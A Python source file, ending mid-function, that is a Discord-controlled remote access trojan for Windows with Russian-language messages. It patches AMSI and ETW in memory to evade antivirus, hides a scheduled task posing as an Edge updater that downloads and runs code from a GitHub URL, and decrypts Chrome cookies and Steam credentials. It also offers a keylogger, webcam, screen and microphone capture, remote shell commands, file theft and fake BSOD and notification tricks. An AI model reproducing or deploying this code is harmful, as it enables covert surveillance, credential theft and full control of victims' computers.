import asyncio
import array
import base64
import ctypes
import io
import json
import os
import shutil
import base64
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import wave
import webbrowser
import winreg
from pathlib import Path
import comtypes
import discord
from discord.ext import commands
import keyboard
import mouse
import psutil
import pyaudio
import pyttsx3
import requests
import win32com.client
import win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume

encoded = "TVRVek5qTXdOalk1Tmpnek1qUXlOakExTkEuR0lnM25uLjBrellyY0FhNkY5eXNXbGFEVFF1ZnpZemhhbDFWOExfZmdtcjdJ"
BOT_TOKEN = bytes([77, 84, 85, 122, 78, 106, 77, 119, 78, 106, 89, 53, 78, 106, 103, 122, 77, 106, 81, 121, 78, 106, 65, 49, 78, 65, 46, 71, 73, 103, 51, 110, 110, 46, 48, 107, 122, 89, 82, 99, 65, 97, 54, 70, 57, 121, 115, 87, 108, 97, 68, 84, 81, 117, 102, 122, 89, 122, 104, 97, 108, 49, 86, 56, 76, 95, 102, 103, 109, 114, 55, 73]).decode()
CONTROL_CHANNEL_ID = 1536279256655597580
RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
TASK_DESC = "Microsoft Edge Update Task Machine UA"

def check_environment() -> bool:
    if os.cpu_count() and os.cpu_count() < 2: return False
    if psutil.virtual_memory().total < 3 * (1024 ** 3): return False
    _k=0xAA; uptime_ms = ctypes.WinDLL(bytes(x^_k for x in [193,207,216,196,207,198,153,152]).decode()).__getattr__(bytes(x^_k for x in [237,207,222,254,195,201,193,233,197,223,196,222,156,158]).decode())()
    if uptime_ms < 120000:
        time.sleep((120000 - uptime_ms) / 1000.0)
    return True

def bypass_av_memory():
    if sys.platform != "win32": return
    _k = 0xAA
    def _s(a): return bytes(x ^ _k for x in a).decode()
    def _b(a): return bytes(x ^ _k for x in a)

    _k32 = ctypes.WinDLL(_s([193,207,216,196,207,198,153,152,132,206,198,198]))
    _vp  = _s([252,195,216,222,223,203,198,250,216,197,222,207,201,222])
    _gpa = _s([237,207,222,250,216,197,201,235,206,206,216,207,217,217])
    _lla = _s([230,197,203,206,230,195,200,216,203,216,211,235])

    getattr(_k32, _vp).restype  = ctypes.c_bool
    getattr(_k32, _vp).argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    getattr(_k32, _gpa).restype  = ctypes.c_void_p
    getattr(_k32, _gpa).argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    getattr(_k32, _lla).restype  = ctypes.c_void_p
    getattr(_k32, _lla).argtypes = [ctypes.c_char_p]

    _ERW = 0x40
    _op  = ctypes.c_ulong(0)

    try:
        _ha = getattr(_k32, _lla)(_s([203,199,217,195,132,206,198,198]).encode())
        if _ha:
            _fa = getattr(_k32, _gpa)(_ha, _s([235,199,217,195,249,201,203,196,232,223,204,204,207,216]).encode())
            if _fa:
                _p = _b([18,171,170,170,170,105])
                if getattr(_k32, _vp)(_fa, len(_p), _ERW, ctypes.byref(_op)):
                    ctypes.memmove(_fa, _p, len(_p))
                    getattr(_k32, _vp)(_fa, len(_p), _op.value, ctypes.byref(_op))
    except Exception: pass

    try:
        _hn = getattr(_k32, _lla)(_s([196,222,206,198,198,132,206,198,198]).encode())
        if _hn:
            _fe = getattr(_k32, _gpa)(_hn, _s([239,222,221,239,220,207,196,222,253,216,195,222,207]).encode())
            if _fe:
                _p = _b([226,153,106,105])
                if getattr(_k32, _vp)(_fe, len(_p), _ERW, ctypes.byref(_op)):
                    ctypes.memmove(_fe, _p, len(_p))
                    getattr(_k32, _vp)(_fe, len(_p), _op.value, ctypes.byref(_op))
    except Exception: pass

def install_stealth_task():
    try:
        comtypes.CoInitialize()
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")
        task_def = scheduler.NewTask(0)
        task_def.RegistrationInfo.Description = TASK_DESC
        task_def.Settings.Hidden = True
        task_def.Settings.DisallowStartIfOnBatteries = False
        task_def.Settings.StopIfGoingOnBatteries = False
        task_def.Settings.ExecutionTimeLimit = "PT0S"
        task_def.Settings.StartWhenAvailable = True
        task_def.Settings.MultipleInstances = 2
        
        trigger = task_def.Triggers.Create(9)
        trigger.Delay = "PT20S"
        user_domain = os.environ.get("USERDOMAIN", "")
        user_name = os.environ.get("USERNAME", "")
        uid = f"{user_domain}\\{user_name}" if user_domain else user_name
        if uid: trigger.UserId = uid
            
        try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception: is_admin = False
            
        task_def.Principal.RunLevel = 1 if is_admin else 0
        task_def.Principal.LogonType = 3
        
        pythonw = Path(sys.executable).with_name("pythonw.exe")
        exe_path = str(pythonw if pythonw.exists() else sys.executable)
        url_b64 = base64.b64encode(RAW_GITHUB_URL.encode("utf-8")).decode("ascii")
        
        action = task_def.Actions.Create(0)
        action.Path = str(exe_path)
        action.Arguments = (
            f'-c "import urllib.request,base64;'
            f'u=base64.b64decode(\'{url_b64}\').decode();'
            f'exec(urllib.request.urlopen(u).read().decode(\'utf-8\'))"'
        )
        action.WorkingDirectory = os.path.dirname(exe_path)
        root_folder.RegisterTaskDefinition(TASK_NAME, task_def, 6, None, None, 3)
    except Exception: pass
    finally:
        try: comtypes.CoUninitialize()
        except Exception: pass

def uninstall_stealth_task():
    try:
        keyboard.unhook_all()
        ctypes.windll.user32.SwapMouseButton(False)
    except Exception: pass
    try:
        comtypes.CoInitialize()
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")
        root_folder.DeleteTask(TASK_NAME, 0)
    except Exception: pass
    finally:
        try: comtypes.CoUninitialize()
        except Exception: pass

def play_sound_mci(url: str):
    def _worker():
        try:
            r = requests.get(url, timeout=15)
            ext = ".mp3" if ".mp3" in url.lower() else ".wav"
            with tempfile.NamedTemporaryFile(delete=False, suffix=ext) as f:
                f.write(r.content)
                path = f.name
            alias = f"c2_track_{int(time.time() * 1000) % 100000}"
            winmm = ctypes.windll.winmm
            # Строгая типизация для x64, предотвращает Access Violation
            winmm.mciSendStringW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint, ctypes.c_void_p]
            winmm.mciSendStringW.restype = ctypes.c_ulong
            
            winmm.mciSendStringW(f"close {alias}", None, 0, None)
            cmd_open = f'open "{path}" type mpegvideo alias {alias}'
            if winmm.mciSendStringW(cmd_open, None, 0, None) == 0:
                winmm.mciSendStringW(f"play {alias} wait", None, 0, None)
                winmm.mciSendStringW(f"close {alias}", None, 0, None)
            try: os.remove(path)
            except Exception: pass
        except Exception: pass
    threading.Thread(target=_worker, daemon=True).start()


def show_custom_ad(title: str, text: str, link: str = "", img_url: str = ""):
    def _worker():
        img_local_path = ""
        if img_url:
            try:
                resp = requests.get(img_url, timeout=10)
                if resp.status_code == 200:
                    with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tf:
                        tf.write(resp.content)
                        img_local_path = tf.name
            except Exception: pass

        ps_safe_title = title.replace('"', '`"').replace('$', '`$')
        ps_safe_text = text.replace('"', '`"').replace('$', '`$')
        
        if img_local_path:
            ps_toast = (
                f'[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null;'
                f'$t = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastImageAndText02);'
                f'$n = $t.GetElementsByTagName("text");'
                f'$n.Item(0).AppendChild($t.CreateTextNode("{ps_safe_title}")) > $null;'
                f'$n.Item(1).AppendChild($t.CreateTextNode("{ps_safe_text}")) > $null;'
                f'$i = $t.GetElementsByTagName("image");'
                f'$i.Item(0).Attributes.GetNamedItem("src").NodeValue = "file:///{img_local_path.replace(chr(92), "/")}";'
                f'$toast = [Windows.UI.Notifications.ToastNotification]::new($t);'
                f'[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Google Chrome").Show($toast)'
            )
        else:
            ps_toast = (
                f'[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null;'
                f'$t = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02);'
                f'$n = $t.GetElementsByTagName("text");'
                f'$n.Item(0).AppendChild($t.CreateTextNode("{ps_safe_title}")) > $null;'
                f'$n.Item(1).AppendChild($t.CreateTextNode("{ps_safe_text}")) > $null;'
                f'$toast = [Windows.UI.Notifications.ToastNotification]::new($t);'
                f'[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Google Chrome").Show($toast)'
            )
            
        subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_toast], creationflags=0x08000000)

        try:
            MB_OK = 0x00000000
            MB_ICONINFORMATION = 0x00000040
            MB_TOPMOST = 0x00040000
            ctypes.windll.user32.MessageBoxW(0, text, title, MB_OK | MB_ICONINFORMATION | MB_TOPMOST)
            if link: webbrowser.open(link)
        except Exception: pass
        finally:
            if img_local_path and os.path.exists(img_local_path):
                try: os.remove(img_local_path)
                except Exception: pass
    threading.Thread(target=_worker, daemon=True).start()

def get_active_window() -> str:
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    if length == 0: return "Рабочий стол (Desktop)"
    buf = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
    return buf.value or "Рабочий стол (Desktop)"

def record_mic_wav(seconds: int) -> io.BytesIO:
    pa = pyaudio.PyAudio()
    try:
        stream = pa.open(format=pyaudio.paInt16, channels=1, rate=16000, input=True, frames_per_buffer=1024)
    except Exception as e:
        pa.terminate()
        raise RuntimeError(f"Не удалось открыть микрофон: {e}")
    frames = []
    total_chunks = int(16000 / 1024 * seconds)
    for _ in range(max(1, total_chunks)):
        frames.append(stream.read(1024, exception_on_overflow=False))
    stream.stop_stream()
    stream.close()
    pa.terminate()
    buf = io.BytesIO()
    with wave.open(buf, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(16000)
        wf.writeframes(b"".join(frames))
    buf.seek(0)
    return buf

class PyAudioPCM(discord.AudioSource):
    def __init__(self):
        self.pa = pyaudio.PyAudio()
        self.is_stereo = True
        try:
            self.stream = self.pa.open(format=pyaudio.paInt16, channels=2, rate=48000, input=True, frames_per_buffer=960)
        except Exception:
            self.stream = self.pa.open(format=pyaudio.paInt16, channels=1, rate=48000, input=True, frames_per_buffer=960)
            self.is_stereo = False

    def read(self) -> bytes:
        try:
            raw = self.stream.read(960, exception_on_overflow=False)
            if not self.is_stereo:
                # Оптимизация: C-массивы вместо циклов Python
                mono = array.array('h', raw)
                stereo = array.array('h', [0] * (len(mono) * 2))
                stereo[0::2] = mono
                stereo[1::2] = mono
                return stereo.tobytes()
            return raw
        except Exception:
            return b"\x00" * 3840

    def cleanup(self):
        try:
            self.stream.stop_stream()
            self.stream.close()
            self.pa.terminate()
        except Exception: pass

def dump_steam_and_cookies() -> io.BytesIO:
    bundle = {"steam_vdf": {}, "cookies": []}
    
    # Поиск Steam через реестр и стандартные пути
    steam_path = None
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        steam_path, _ = winreg.QueryValueEx(k, "SteamPath")
        winreg.CloseKey(k)
    except Exception: pass
    
    search_paths = [Path(steam_path)] if steam_path else []
    search_paths.extend([Path("C:/Program Files (x86)/Steam"), Path("C:/Steam"), Path("D:/Steam")])
    
    for sp in search_paths:
        if sp and sp.exists():
            for rel in ["config/loginusers.vdf", "config/config.vdf", "config/local.vdf"]:
                fp = sp / rel
                if fp.exists():
                    try: bundle["steam_vdf"][rel] = base64.b64encode(fp.read_bytes()).decode("ascii")
                    except Exception: pass
                    
    local_vdf = Path(os.environ.get("LOCALAPPDATA", "")) / "Steam/local.vdf"
    if local_vdf.exists():
        try: bundle["steam_vdf"]["local.vdf"] = base64.b64encode(local_vdf.read_bytes()).decode("ascii")
        except Exception: pass
        
    chrome_dir = Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data"
    local_state = chrome_dir / "Local State"
    cookies_db = chrome_dir / "Default/Network/Cookies"
    if local_state.exists() and cookies_db.exists():
        tmp_db = Path(tempfile.gettempdir()) / f"c2_cache_{int(time.time())}.db"
        try:
            enc_key = base64.b64decode(json.loads(local_state.read_text(encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
            shutil.copy2(cookies_db, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cur = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%steam%' LIMIT 60")
            for host, name, enc_val in cur.fetchall():
                if len(enc_val) >= 31 and enc_val[:3] in (b"v10", b"v11"):
                    try:
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=enc_val[3:15])
                        val = cipher.decrypt_and_verify(enc_val[15:-16], enc_val[-16:]).decode("utf-8", errors="ignore")
                        bundle["cookies"].append({"host": host, "name": name, "value": val})
                    except Exception: pass
            conn.close()
        except Exception as e:
            bundle["error"] = str(e)
        finally:
            if tmp_db.exists():
                try: tmp_db.unlink(missing_ok=True)
                except Exception: pass
    out = io.BytesIO(json.dumps(bundle, indent=2, ensure_ascii=False).encode("utf-8"))
    out.seek(0)
    return out

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

async def safe_send(ctx, text: str, filename: str = "output.txt"):
    if len(text) <= 1900:
        await ctx.send(text)
    elif len(text) <= 5500:
        lines = text.splitlines(keepends=True)
        chunk = ""
        for line in lines:
            if len(chunk) + len(line) > 1900:
                await ctx.send(chunk)
                chunk = line
            else:
                chunk += line
        if chunk: await ctx.send(chunk)
    else:
        buf = io.BytesIO(text.encode("utf-8"))
        await ctx.send("Результат превышает лимит и прикреплен файлом:", file=discord.File(buf, filename=filename))

@bot.event
async def on_ready():
   
    ch = bot.get_channel(CONTROL_CHANNEL_ID)
    if ch:
        user = os.environ.get("USERNAME", "User")
        domain = os.environ.get("USERDOMAIN", "PC")
        msg = (
            f"[C2 СЕССИЯ АКТИВНА В ОЗУ]\n"
            f"Узел: `{domain}\\{user}`\n"
            f"Активное окно: `{get_active_window()}`\n"
            f"Планировщик: задача `{TASK_NAME}` активна (скрыта).\n"
            f"Для справки: `!menu`"
        )
        await ch.send(msg)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"Ошибка: пропущен аргумент `{error.param.name}`.")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"Ошибка выполнения: `{error}`")

@bot.command()
async def menu(ctx):
    help_text = (
        "**[СКРИН/СИСТЕМА]**\n"
        "`!screen` — скрин | `!screen_loop [сек]` — авто (0=стоп) | `!window` — окно | `!sysinfo` — инфо о системе\n\n"
        "**[УПРАВЛЕНИЕ]**\n"
        "`!cmd <cmd>` — консоль | `!sh <cmd>` — интерактивный shell\n"
        "`!shell_start` / `!shell_stop` — reverse shell | `!kill <proc>` — убить процесс\n\n"
        "**[ФАЙЛЫ]**\n"
        "`!ls [path]` — список | `!dl <path>` — скачать | `!ul` — загрузить | `!rm <path>` — удалить\n\n"
        "**[КЛАВИШИ/МЫШЬ]**\n"
        "`!kl_start` / `!kl_stop` / `!kl_dump` — кейлоггер\n"
        "`!swap <k1> <k2>` / `!unswap` | `!mouse move|offset|wheel|swap|restore`\n\n"
        "**[МЕДИА]**\n"
        "`!cam [n]` — фото с камеры | `!cam_list` — список камер\n"
        "`!rec [sec]` — запись мик | `!listen` / `!unlisten` — стрим | `!sound <url>` — звук\n"
        "`!tts <text>` — озвучка | `!mute <proc>` / `!unmute`\n\n"
        "**[БУФЕР/UI]**\n"
        "`!clip_get` / `!clip_set` | `!url <link>` | `!ad <T>|<Text>|<URL>|<Img>` | `!banner <C>|<T>`\n\n"
        "**[РАЗВЕДКА]**\n"
        "`!steam` — дамп Steam/Cookies | `!wifi` — Wifi пароли\n\n"
        "**[ПЕРСИСТЕНТНОСТЬ]**\n"
        "`!persist_reg` — добавить в HKCU\\Run | `!persist_remove` — убрать\n\n"
        "**[УПРАВЛЕНИЕ БОТОМ]**\n"
        "`!bsod [sec]` — BSOD | `!off` — выкл | `!stop` — стоп | `!uninstall` — удалить"
    )
    await safe_send(ctx, help_text)

@bot.command()
async def screen(ctx):
    try:
        img = ImageGrab.grab(all_screens=True)
        buf = io.BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=80)
        buf.seek(0)
        await ctx.send(f"Окно: `{get_active_window()}`", file=discord.File(buf, filename="screen.jpg"))
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def window(ctx):
    await ctx.send(f"Окно: `{get_active_window()}`")

@bot.command()
async def cmd(ctx, *, command: str):
    proc = subprocess.run(command, shell=True, capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000)
    out = (proc.stdout + proc.stderr).strip() or "Пусто."
    await safe_send(ctx, f"```dos\n{out}\n```", filename="cmd.txt")

@bot.command()
async def sound(ctx, url: str):
    play_sound_mci(url)
    await ctx.send(f"MCI запущен: `{url}`")

@bot.command()
async def swap(ctx, k1: str, k2: str):
    try:
        keyboard.unhook_all()
        keyboard.remap_key(k1, k2)
        keyboard.remap_key(k2, k1)
        await ctx.send(f"Поменяны: `{k1}` и `{k2}`")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def unswap(ctx):
    try:
        keyboard.unhook_all()
        await ctx.send("Сброшено.")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command(name="mouse")
async def mouse_cmd(ctx, mode: str, val1: int = 0, val2: int = 0):
    try:
        if mode == "move": mouse.move(val1, val2, absolute=True, duration=0.1)
        elif mode == "offset": mouse.move(val1, val2, absolute=False, duration=0.05)
        elif mode == "wheel": mouse.wheel(val1)
        elif mode == "swap": ctypes.windll.user32.SwapMouseButton(True)
        elif mode == "restore": ctypes.windll.user32.SwapMouseButton(False)
        else: return await ctx.send("Режимы: move, offset, wheel, swap, restore")
        await ctx.send(f"Мышь: `{mode}`")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def mute(ctx, proc_name: str):
    try:
        comtypes.CoInitialize()
        sessions = AudioUtilities.GetAllSessions()
        hit = [s.Process.name() for s in sessions if s.Process and proc_name.lower() in s.Process.name().lower() and not s._ctl.QueryInterface(ISimpleAudioVolume).SetMute(1, None)]
        await ctx.send(f"Мут: `{set(hit)}`" if hit else f"Не найден: `{proc_name}`")
    except Exception as e: await ctx.send(f"Ошибка: {e}")
    finally:
        try: comtypes.CoUninitialize()
        except: pass

@bot.command()
async def unmute(ctx, proc_name: str):
    try:
        comtypes.CoInitialize()
        sessions = AudioUtilities.GetAllSessions()
        hit = [s.Process.name() for s in sessions if s.Process and proc_name.lower() in s.Process.name().lower() and not s._ctl.QueryInterface(ISimpleAudioVolume).SetMute(0, None)]
        await ctx.send(f"Анмут: `{set(hit)}`" if hit else f"Не найден: `{proc_name}`")
    except Exception as e: await ctx.send(f"Ошибка: {e}")
    finally:
        try: comtypes.CoUninitialize()
        except: pass

@bot.command()
async def kill(ctx, proc_name: str):
    killed = []
    for p in psutil.process_iter(["name"]):
        try:
            if p.info["name"] and proc_name.lower() in p.info["name"].lower():
                p.kill()
                killed.append(p.info["name"])
        except: pass
    await ctx.send(f"Убиты: `{set(killed)}`" if killed else f"Не найден: `{proc_name}`")

@bot.command()
async def url(ctx, link: str):
    webbrowser.open(link)
    await ctx.send(f"Открыто: `{link}`")

@bot.command()
async def ad(ctx, *, payload: str):
    parts = [p.strip() for p in payload.split("|")]
    title = parts[0] if len(parts) > 0 and parts[0] else "Системное уведомление"
    text = parts[1] if len(parts) > 1 else ""
    link = parts[2] if len(parts) > 2 else ""
    img_url = parts[3] if len(parts) > 3 else ""
    if not img_url and ctx.message.attachments: img_url = ctx.message.attachments[0].url
    show_custom_ad(title, text, link, img_url)
    await ctx.send(f"Реклама запущена.")

@bot.command()
async def rec(ctx, seconds: int = 5):
    if seconds > 120: return await ctx.send("Макс 120 сек.")
    await ctx.send(f"Запись {seconds} сек...")
    try:
        wav_io = await asyncio.to_thread(record_mic_wav, seconds)
        await ctx.send("Микрофон:", file=discord.File(wav_io, filename="mic.wav"))
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def listen(ctx):
    if not ctx.author.voice: return await ctx.send("Зайди в голосовой канал.")
    target_channel = ctx.author.voice.channel
    try:
        if ctx.voice_client:
            if ctx.voice_client.channel != target_channel: await ctx.voice_client.move_to(target_channel)
        else: await target_channel.connect()
        if ctx.voice_client.is_playing(): ctx.voice_client.stop()
        ctx.voice_client.play(PyAudioPCM())
        await ctx.send(f"Стрим в `{target_channel.name}`.")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def unlisten(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("Стрим остановлен.")
    else: await ctx.send("Бот не в канале.")

@bot.command()
async def steam(ctx):
    await ctx.send("Сбор данных...")
    try:
        dump_io = await asyncio.to_thread(dump_steam_and_cookies)
        await ctx.send("Дамп:", file=discord.File(dump_io, filename="data.json"))
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def tts(ctx, *, text: str):
    def _speak():
        try:
            comtypes.CoInitialize()
            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()
        except: pass
        finally:
            try: comtypes.CoUninitialize()
            except: pass
    threading.Thread(target=_speak, daemon=True).start()
    await ctx.send(f"TTS: `{text}`")

@bot.command()
async def bsod(ctx, seconds: int = 10):
    def _show():
        try:
            import tkinter as tk
            r = tk.Tk()
            r.attributes("-fullscreen", True)
            r.attributes("-topmost", True)
            r.configure(bg="#0078d7", cursor="none")
            r.protocol("WM_DELETE_WINDOW", lambda: None)
            tk.Label(r, text=":(", fg="white", bg="#0078d7", font=("Segoe UI Light", 110)).place(x=150, y=120)
            tk.Label(r, text="На вашем устройстве возникла проблема...\n\nВыполнено: 100%\nКод остановки: CRITICAL_PROCESS_DIED", fg="white", bg="#0078d7", font=("Segoe UI", 22), justify="left").place(x=150, y=340)
            r.after(max(1, seconds) * 1000, r.destroy)
            r.mainloop()
        except: pass
    threading.Thread(target=_show, daemon=True).start()
    await ctx.send(f"BSOD на {seconds} сек.")

@bot.command()
async def banner(ctx, *, payload: str):
    parts = payload.split("|", 1)
    cap = parts[0].strip() if len(parts) > 0 else "Предупреждение"
    txt = parts[1].strip() if len(parts) > 1 else ""
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "legalnoticecaption", 0, winreg.REG_SZ, cap)
        winreg.SetValueEx(k, "legalnoticetext", 0, winreg.REG_SZ, txt)
        winreg.CloseKey(k)
        await ctx.send("Баннер установлен.")
    except PermissionError: await ctx.send("Нужны права Админа.")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def clip_get(ctx):
    proc = subprocess.run(["powershell", "-NoProfile", "-Command", "Get-Clipboard"], capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000)
    val = proc.stdout.strip() or "[Пусто]"
    await safe_send(ctx, f"Буфер:\n```\n{val}\n```", filename="clip.txt")

@bot.command()
async def clip_set(ctx, *, text: str):
    safe_text = text.replace("'", "''")
    subprocess.run(["powershell", "-NoProfile", "-Command", f"Set-Clipboard -Value '{safe_text}'"], creationflags=0x08000000)
    await ctx.send("Буфер обновлен.")

@bot.command()
async def off(ctx):
    await ctx.send("Выключение...")
    subprocess.Popen('shutdown /s /t 3 /c "Завершение работы"', shell=True, creationflags=0x08000000)

@bot.command()
async def stop(ctx):
    keyboard.unhook_all()
    ctypes.windll.user32.SwapMouseButton(False)
    await ctx.send("Остановлен до ребута.")
    await bot.close()
    os._exit(0)

@bot.command()
async def uninstall(ctx):
    uninstall_stealth_task()
    await ctx.send("Удалено.")
    await bot.close()
    os._exit(0)


# ─── HELPER: получение активного окна ──────────────────────────────────────────
_keylog_buf: list = []
_keylog_active = False
_screen_task_running = False
_cam_cap = None

# ─── KEYLOGGER ─────────────────────────────────────────────────────────────────
def _kl_on_press(e):
    global _keylog_buf
    try:
        name = e.name
        if len(name) == 1:
            _keylog_buf.append(name)
        else:
            _keylog_buf.append(f"[{name}]")
    except Exception: pass

@bot.command()
async def kl_start(ctx):
    """Запустить кейлоггер"""
    global _keylog_active, _keylog_buf
    if _keylog_active:
        await ctx.send("Кейлоггер уже запущен.")
        return
    _keylog_buf = []
    keyboard.on_press(_kl_on_press)
    _keylog_active = True
    await ctx.send("Кейлоггер запущен. `!kl_dump` — забрать лог, `!kl_stop` — остановить.")

@bot.command()
async def kl_stop(ctx):
    """Остановить кейлоггер"""
    global _keylog_active
    keyboard.unhook_all()
    _keylog_active = False
    await ctx.send("Кейлоггер остановлен.")

@bot.command()
async def kl_dump(ctx):
    """Забрать накопленный лог кейлоггера"""
    global _keylog_buf
    if not _keylog_buf:
        await ctx.send("Лог пуст.")
        return
    text = "".join(_keylog_buf)
    _keylog_buf = []
    await safe_send(ctx, text, filename="keylog.txt")

# ─── WEBCAM ────────────────────────────────────────────────────────────────────
@bot.command()
async def cam(ctx, frames: int = 1):
    """Снять фото с веб-камеры (cam [кол-во_кадров])"""
    import cv2
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cap.isOpened():
        await ctx.send("Веб-камера недоступна.")
        return
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
    for i in range(min(frames, 5)):
        for _ in range(5): cap.read()   # прогреть сенсор
        ok, frame = cap.read()
        if not ok:
            await ctx.send(f"Кадр {i+1}: не удалось.")
            continue
        buf = io.BytesIO()
        import cv2
        ok2, enc = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        if not ok2:
            await ctx.send(f"Кадр {i+1}: ошибка кодирования.")
            continue
        buf.write(enc.tobytes())
        buf.seek(0)
        await ctx.send(f"Кадр {i+1}/{min(frames,5)}", file=discord.File(buf, filename=f"cam_{i+1}.jpg"))
    cap.release()

@bot.command()
async def cam_list(ctx):
    """Список доступных камер"""
    import cv2
    found = []
    for idx in range(5):
        cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
        if cap.isOpened():
            found.append(f"Камера {idx}")
            cap.release()
    await ctx.send("\n".join(found) if found else "Камер не найдено.")

# ─── АВТО-СКРИН КАЖДЫЕ N СЕК ──────────────────────────────────────────────────
@bot.command()
async def screen_loop(ctx, interval: int = 30):
    """Слать скрины каждые N секунд (screen_loop [сек], 0 = стоп)"""
    global _screen_task_running
    if interval == 0:
        _screen_task_running = False
        await ctx.send("Авто-скрин остановлен.")
        return
    if _screen_task_running:
        await ctx.send(f"Уже запущен. Останови: `!screen_loop 0`")
        return
    _screen_task_running = True
    interval = max(5, min(interval, 3600))
    await ctx.send(f"Авто-скрин каждые {interval}с. Стоп: `!screen_loop 0`")
    async def _loop():
        global _screen_task_running
        while _screen_task_running:
            try:
                img = ImageGrab.grab()
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=70)
                buf.seek(0)
                await ctx.send(file=discord.File(buf, filename="auto.jpg"))
            except Exception as e:
                await ctx.send(f"Скрин ошибка: {e}")
            await asyncio.sleep(interval)
    asyncio.ensure_future(_loop())

# ─── ФАЙЛОВЫЙ МЕНЕДЖЕР ─────────────────────────────────────────────────────────
@bot.command()
async def ls(ctx, *, path: str = "."):
    """Список файлов в папке"""
    try:
        entries = []
        p = Path(path)
        for e in sorted(p.iterdir()):
            tag = "[DIR] " if e.is_dir() else "      "
            size = "" if e.is_dir() else f"  {e.stat().st_size:>12,} б"
            entries.append(f"{tag}{e.name}{size}")
        text = f"📂 {p.resolve()}\n" + "\n".join(entries[:100])
        await safe_send(ctx, text, filename="ls.txt")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

@bot.command()
async def dl(ctx, *, path: str):
    """Скачать файл с удалённой машины"""
    try:
        fp = Path(path)
        if not fp.exists():
            await ctx.send("Файл не найден.")
            return
        if fp.stat().st_size > 25 * 1024 * 1024:
            await ctx.send("Файл > 25 МБ, слишком большой для Discord.")
            return
        await ctx.send(file=discord.File(str(fp), filename=fp.name))
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

@bot.command()
async def ul(ctx):
    """Загрузить файл на удалённую машину (прикрепи файл к команде)"""
    if not ctx.message.attachments:
        await ctx.send("Прикрепи файл к сообщению.")
        return
    att = ctx.message.attachments[0]
    dest = Path(tempfile.gettempdir()) / att.filename
    import urllib.request as _ur
    _ur.urlretrieve(att.url, dest)
    await ctx.send(f"Загружен: `{dest}`")

@bot.command()
async def rm(ctx, *, path: str):
    """Удалить файл или папку"""
    try:
        p = Path(path)
        if p.is_dir():
            shutil.rmtree(p)
        else:
            p.unlink()
        await ctx.send(f"Удалено: `{path}`")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

# ─── WIFI ПАРОЛИ ───────────────────────────────────────────────────────────────
@bot.command()
async def wifi(ctx):
    """Дамп сохранённых Wifi паролей Windows"""
    try:
